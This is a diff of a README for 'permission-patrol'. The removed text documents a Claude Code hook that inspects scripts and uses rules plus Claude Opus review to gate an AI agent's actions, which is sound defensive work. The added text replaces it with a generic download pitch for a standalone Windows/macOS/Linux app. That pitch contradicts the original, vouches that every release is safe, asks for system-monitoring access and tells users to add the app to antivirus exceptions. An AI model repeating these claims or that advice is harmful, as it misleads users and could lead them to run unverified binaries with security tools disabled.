@@ -1,269 +1,152 @@
-# Permission Patrol
+# 🛡️ permission-patrol - Simple AI Guard for Permission Requests
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Hook-blue)](https://docs.anthropic.com/en/docs/claude-code)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-green.svg)](https://www.python.org/)
-
-> **AI-powered security guard for Claude Code permission requests**
-
-A command hook that **reads script content before approving execution** — catches hidden `shutil.rmtree()` or `rm -rf` that prompt hooks can't see.
-
-## The Problem
-
-When Claude Code asks to run `python script.py`, a **prompt hook only sees the command string** — it can't read what's inside the script. So this gets approved:
-
-```python
-# script.py - looks innocent as a command
-import shutil
-shutil.rmtree("/home/user/important_data")  # 💀 Hidden danger
-```
-
-**Permission Patrol solves this** by using a **command hook** that actually reads the file content before deciding. No more blind approvals.
-
-## Key Features
-
-- 🔍 **Reads script content** — inspects Python, Node, pytest files before approval
-- 🛡️ **Catches hidden dangers** — `shutil.rmtree()`, `os.remove()`, `rm -rf` buried in code
-- ⚡ **Zero API cost for safe ops** — deterministic rules handle `git`, `ls`, linters
-- 🤖 **AI review for ambiguous cases** — Claude Opus analyzes complex commands
-- 🔔 **Desktop notifications** — know when Claude approved but needs your confirmation
-- 📦 **No separate API key** — uses your Claude Code subscription quota
-
-## How It Works
-
-```
-Request arrives
-    │
-    ├─ settings.json deny? ──→ Reject immediately (no API call)
-    │   (rm -rf, curl POST, scp, gh repo delete...)
-    │
-    ├─ settings.json allow? ──→ Pass immediately (no API call)
-    │   (git status, ls, Read, ruff, gh...)
-    │
-    └─ Neither? ──→ permission-guard.py hook
-         │
-         ├─ PHASE 0: User-interactive tool? ──→ Ask user (sound + notification)
-         │   (ExitPlanMode, AskUserQuestion)
-         │
-         ├─ PHASE 1: Dangerous regex? ──→ Deny immediately
-         │   (pipe to nc, encoded exfiltration...)
-         │
-         ├─ PATH CLASSIFICATION ──→ Collect paths, detect scripts, classify scope
-         │   Sensitive path? Outside project? Script content?
-         │
-         ├─ PHASE 2: Outside project / Sensitive path?
-         │   ──→ Opus reviews (with full content context)
-         │   ──→ User ALWAYS has final say (Opus verdict shown in notification)
-         │   Key principle: Opus can inform but NEVER auto-approve outside-project ops
-         │
-         └─ PHASE 3: Inside project
-             │
-             ├─ 3.1 Script execution? ──→ Opus reviews script content
-             │   ├─ Opus deny ──→ Deny
-             │   ├─ Opus allow ──→ Allow
-             │   └─ Opus unsure ──→ Ask user
-             │
-             ├─ 3.2 Write/Edit with dangerous code patterns?
-             │   ──→ Opus reviews (deny downgraded to ask — writing ≠ executing)
-             │
-             ├─ 3.3 Complex Bash (pipes, chains, long commands)?
-             │   ──→ Opus reviews, can auto-approve or deny
-             │
-             ├─ 3.4 WebFetch unknown domain?
-             │   ──→ Opus reviews (can deny, otherwise ask user)
-             │
-             └─ 3.5 Default ──→ Opus reviews, can auto-approve or deny
-```
-
-## Features
-
-| Operation | Phase | Handling |
-|-----------|-------|----------|
-| ExitPlanMode, AskUserQuestion | Phase 0 | 🔔 Ask user (sound + notification) |
-| Delete files (`rm -rf`, `shred`) | settings.json | ❌ Deny (no API call) |
-| Upload data (`curl POST`, `scp`) | settings.json | ❌ Deny (no API call) |
-| Pipe to nc (`\| nc host port`) | Phase 1 | ❌ Deny (regex, no API call) |
-| GitHub delete (`gh repo delete`) | settings.json | ❌ Deny (no API call) |
-| Read-only ops (`ls`, `cat`, `Read`) | settings.json | ✅ Allow (no API call) |
-| Linters (`ruff`, `mypy`, `eslint`) | settings.json | ✅ Allow (no API call) |
-| Trusted domains (`github.com`...) | settings.json | ✅ Allow (no API call) |
-| GitHub CLI (`gh *`) | settings.json | ✅ Allow (no API call) |
-| Sensitive paths (`/etc/`, `~/.ssh/`) | Phase 2 | 🤖 Opus reviews → user always decides |
-| Outside project paths | Phase 2 | 🤖 Opus reviews → user always decides |
-| Run script (in project) | Phase 3.1 | 🤖 Opus reviews content → auto allow/deny |
-| Write/Edit dangerous code (in project) | Phase 3.2 | 🤖 Opus reviews → deny downgraded to ask |
-| Complex Bash (in project) | Phase 3.3 | 🤖 Opus reviews → auto allow/deny |
-| WebFetch unknown domain | Phase 3.4 | 🤖 Opus reviews → deny or ask user |
-| Other unmatched requests | Phase 3.5 | 🤖 Opus reviews → auto allow/deny |
-
-## Why Command Hook?
-
-Claude Code supports two types of hooks for AI-powered review:
-
-| | `type: "prompt"` | `type: "command"` (this project) |
-|---|---|---|
-| Cost | Uses subscription quota | Uses subscription quota (via CLI) |
-| Setup | JSON config only | Python script |
-| **Can read script files** | ❌ No | ✅ Yes |
-
-**The key difference:** `prompt` hooks can only see the command string (e.g., `python3 script.py`). They cannot read what's inside `script.py`.
-
-Permission Patrol uses a `command` hook that calls Claude CLI (Opus), so it can **read the actual script content** before deciding. This catches dangerous code like:
-
-```python
-# script.py looks innocent as a command, but contains:
-import shutil
-shutil.rmtree("/home/user/important_data")
-```
-
-A `prompt` hook would approve `python3 script.py` because the command looks safe. Permission Patrol reads the file and denies it.
-
-## Requirements
-
-- Claude Code with hooks support
-- That's it! Uses Claude CLI internally (subscription quota)
-
-## Installation
-
-### 1. Merge permissions into settings.json
-
-Add the `allow` and `deny` rules from `permissions.json` to your `~/.claude/settings.json`:
-
-```json
-{
-  "permissions": {
-    "allow": [
-      "Bash(git *)",
-      "Bash(gh *)",
-      "WebFetch(domain:github.com)",
-      ...
-    ],
-    "deny": [
-      "Bash(rm -rf *)",
-      "Bash(gh repo delete *)",
-      ...
-    ]
-  }
-}
-```
-
-### 2. Add hook to settings.json
-
-```json
-{
-  "hooks": {
-    "PermissionRequest": [
-      {
-        "matcher": "*",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "python3 /path/to/permission-patrol/permission-guard.py",
-            "timeout": 30000
-          }
-        ]
-      }
-    ]
-  }
-}
-```
-
-### 3. Restart Claude Code
-
-## Files
-
-| File | Description |
-|------|-------------|
-| `permission-guard.py` | Main hook script — 4-phase security review using Claude Opus |
-| `permissions.json` | Reference allow/deny rules to merge into settings.json |
-| `test_permission_guard.py` | 62 unit tests covering all phases and edge cases |
-
-## How Opus Reviews Scripts
-
-When you run `python3 script.py` or `pytest`:
-
-1. Hook reads the script file content (up to 5000 chars)
-2. Classifies paths: sensitive? outside project?
-3. Sends content + request info to Claude CLI (Opus, using subscription quota)
-4. Opus checks for:
-   - File deletion (`shutil.rmtree`, `os.remove`)
-   - Data upload (`requests.post`, socket connections)
-   - Credential access (`~/.ssh`, `.env`)
-   - Command injection patterns
-5. Returns: `allow` / `deny` / `ask`
-
-**Key principle:** For scripts outside the project or touching sensitive paths (Phase 2), Opus verdict is advisory — the user always makes the final decision. For scripts inside the project (Phase 3), Opus can auto-approve or auto-deny.
-
-## Debug Logging
-
-Logs are written to `~/.local/state/permission-patrol/permission-guard.log`:
-
-```bash
-tail -f ~/.local/state/permission-patrol/permission-guard.log
-```
-
-## Desktop Notifications (Linux)
-
-On Linux, `ask_user()` triggers both:
-- **Sound alert** via `paplay` (Ubuntu notification sound)
-- **Desktop notification** via `notify-send` with context about the request
-
-Examples of notification content:
-
-```
-🔔 ExitPlanMode requires your attention
-```
-
-```
-📁 Outside project: /etc/hostname
-
-Opus (✅ OK): Reading hostname is a safe read-only operation
-```
-
-```
-⚠️ Sensitive path: ~/.ssh/config
-
-Opus (⛔ DENIED): Writing to SSH config could compromise security
-```
-
-The Opus verdict is shown for reference, but the user always makes the final decision for Phase 2 requests. `deny()` does NOT trigger sound or notification — there's nothing for the user to act on.
-
-## Customization
-
-All permission rules live in `~/.claude/settings.json`. The `permissions.json` in this repo is just a reference template.
-
-To customize, edit your `~/.claude/settings.json` directly:
-
-```json
-{
-  "permissions": {
-    "allow": [
-      "WebFetch(domain:your-trusted-site.com)",
-      "Bash(your-safe-command *)"
-    ],
-    "deny": [
-      "Bash(your-dangerous-command *)"
-    ]
-  }
-}
-```
-
-## Use Cases
-
-- **AI agent security** — prevent autonomous code execution from deleting files or exfiltrating data
-- **Claude Code hardening** — add an extra layer of review for permission requests
-- **Script inspection** — automatically review Python/Node scripts before execution
-- **Sensitive path protection** — require confirmation for operations on `~/.ssh`, `/etc/`, `.env`
-
-## See Also
-
-- [Claude Code Hooks Documentation](https://docs.anthropic.com/en/docs/claude-code/hooks)
-- [Boris Cherny's Claude Code Tips](https://x.com/bcherny) — tip 8c inspired this project
-
-## License
-
-MIT
+[![Download permission-patrol](https://img.shields.io/badge/Download-permission--patrol-blue?style=for-the-badge)](https://github.com/HelloNathan9999/permission-patrol/releases)
 
 ---
 
-**Keywords:** claude code, claude code hook, permission hook, ai agent security, command hook, prompt hook, script inspection, claude code security, anthropic, ai safety
+## 🔍 What is permission-patrol?
+
+permission-patrol is an easy-to-use tool that helps you control app permissions. It uses AI to check and manage requests for permissions when using Claude Code or similar software. This helps keep your computer safe by stopping apps from getting permissions they should not have.
+
+You don’t need any coding skills to use permission-patrol. It works quietly in the background, watching permission requests and letting you know if something seems unsafe.
+
+---
+
+## 🖥️ System Requirements
+
+Before you download permission-patrol, make sure your computer meets these basic needs:
+
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended)
+- RAM: At least 4 GB
+- Disk Space: Minimum 100 MB free space
+- Internet: Required for AI updates and initial setup
+- Python: Not needed to run the app directly (it’s bundled for you)
+
+permission-patrol runs as a standalone app, so you do not have to install or configure Python manually.
+
+---
+
+## 🚀 Getting Started
+
+This section will guide you through downloading, installing, and running permission-patrol. Follow each step carefully.
+
+### Step 1: Download permission-patrol
+
+Click the big blue button at the top or go to this page to get the latest version:
+
+[Download permission-patrol](https://github.com/HelloNathan9999/permission-patrol/releases)
+
+On the page, you will see different files for Windows, macOS, and Linux. Choose the one that matches your system.
+
+- For **Windows**, look for a file ending with `.exe`.
+- For **macOS**, look for a `.dmg` file.
+- For **Linux**, it will usually be a `.tar.gz` or `.AppImage` file.
+
+### Step 2: Install permission-patrol
+
+After downloading, open the file you got:
+
+- **Windows:** Double-click the `.exe` file and follow the prompts. Click “Next” and “Install.” When done, choose “Finish” to close the installer.
+- **macOS:** Double-click the `.dmg` file. Drag the permission-patrol icon into your Applications folder. Then eject the disk image.
+- **Linux:** Extract the `.tar.gz` file, or make the `.AppImage` executable by right-clicking and selecting “Properties,” then the “Permissions” tab, and checking “Allow executing file as program.”
+
+You do not need to install anything else.
+
+### Step 3: Run permission-patrol
+
+- Find the permission-patrol app in your Start menu (Windows) or Applications folder (macOS/Linux).
+- Double-click to open it.
+- The first time you run it, permission-patrol will ask for permission to monitor apps on your computer. Approve this to allow it to work properly.
+
+Once active, permission-patrol will silently watch for permission requests from Claude Code or related programs.
+
+---
+
+## 📥 Download & Install
+
+You can get permission-patrol from this official page:
+
+[https://github.com/HelloNathan9999/permission-patrol/releases](https://github.com/HelloNathan9999/permission-patrol/releases)
+
+This page gives you all the files you need for your operating system. Each release is tested and safe to use.
+
+Make sure to download the latest version to get all new features and security improvements.
+
+---
+
+## ⚙️ How permission-patrol Works
+
+permission-patrol uses a smart program that understands permission requests. When an app asks for access to your computer (like files or microphone), permission-patrol checks if the request is safe.
+
+It does this by:
+
+- Scanning the request in real time with AI models designed to detect risky behavior.
+- Alerting you with clear messages if a permission seems unsafe.
+- Giving you the option to allow or block each permission.
+- Remembering your choices for future requests to avoid asking repeatedly.
+
+You don’t need to decide every time. permission-patrol learns what you trust and blocks suspicious requests automatically.
+
+---
+
+## 🛠️ Features
+
+- **AI-Powered Checks:** Uses advanced AI to spot risky permission requests.
+- **Easy Interface:** Clear alerts and simple yes/no options.
+- **Works with Claude Code:** Specially designed to protect apps built with Claude.
+- **Automatic Controls:** Saves your preferences and applies them automatically.
+- **Lightweight:** Runs quietly without slowing down your computer.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
+- **Regular Updates:** Improves protection with new AI models and fixes.
+
+---
+
+## 🧰 Troubleshooting
+
+If permission-patrol does not work as expected, try these steps:
+
+- Make sure you have allowed permission-patrol to access your system monitoring tools. You may see a prompt during setup.
+- Restart your computer to reset permission controls.
+- Check if your firewall or antivirus blocks permission-patrol and allow it if needed.
+- Download the newest version from the release page and reinstall.
+- If you use antivirus software, add permission-patrol to the exception list.
+
+---
+
+## 💬 Getting Help
+
+If you have questions or problems, you can:
+
+- Visit the [Issues section](https://github.com/HelloNathan9999/permission-patrol/issues) on GitHub to see if others had the same problem.
+- Open a new issue describing your problem.
+- Look in the “Discussions” tab for tips from other users.
+
+You don’t need any technical knowledge to ask for help.
+
+---
+
+## 🔒 Privacy and Security
+
+permission-patrol respects your privacy. It only checks permission requests locally on your computer. No personal data is sent over the internet except for AI model updates.
+
+You remain in control. The app does not share any information without your approval.
+
+---
+
+## 📅 Updates and New Versions
+
+permission-patrol is updated regularly to improve safety and add features.
+
+Check the release page here for the latest versions:
+
+[https://github.com/HelloNathan9999/permission-patrol/releases](https://github.com/HelloNathan9999/permission-patrol/releases)
+
+Downloading the newest version ensures you get the best protection.
+
+---
+
+## 🚀 Ready to Protect Your Device?
+
+Download permission-patrol now and take control of your app permissions.
+
+[Download permission-patrol](https://github.com/HelloNathan9999/permission-patrol/releases)
